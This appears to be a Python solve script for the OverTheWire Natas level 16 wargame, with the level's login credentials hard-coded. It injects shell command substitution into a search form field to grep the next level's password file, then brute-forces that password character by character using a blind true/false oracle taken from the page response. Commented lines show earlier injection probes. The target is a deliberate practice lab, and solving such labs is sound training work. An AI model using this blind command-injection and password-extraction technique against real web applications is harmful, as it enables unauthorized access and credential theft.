import re
import requests
import string

level = 16
creds = ('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
url   = 'http://natas%s.natas.labs.overthewire.org' % level

char_set = string.ascii_lowercase[:26]+string.ascii_uppercase[:26]
for i in range(10):
	char_set+=str(i)

#print(char_set)

session = requests.Session()
response = session.get(url,auth=creds)
data = response.text

#formdata = {'needle':'$(echo heta)','submit':'submit'}
#formdata = {'needle':'$(grep etam dictionary.txt)','submit':'submit'}
#formdata = {'needle':'$(grep a /etc/natas_webpass/natas17)','submit':'submit'}
#metamorphoses$(grep b /etc/natas_webpass/natas17
password = ''

while len(password)<32:
	print("Current Guess =>"+password+"  "+str(len(password)))
	for char in char_set:
		#print(char)
		temp_password = password+char
		injection = 'metamorphoses$(grep ^'+temp_password+' /etc/natas_webpass/natas17)'

		formdata = {'needle':injection,'submit':'Search'}
		response = session.post(url,auth=creds,data=formdata)
		data = response.text

		if "metamorphoses" not in data:
			password=temp_password
print(password)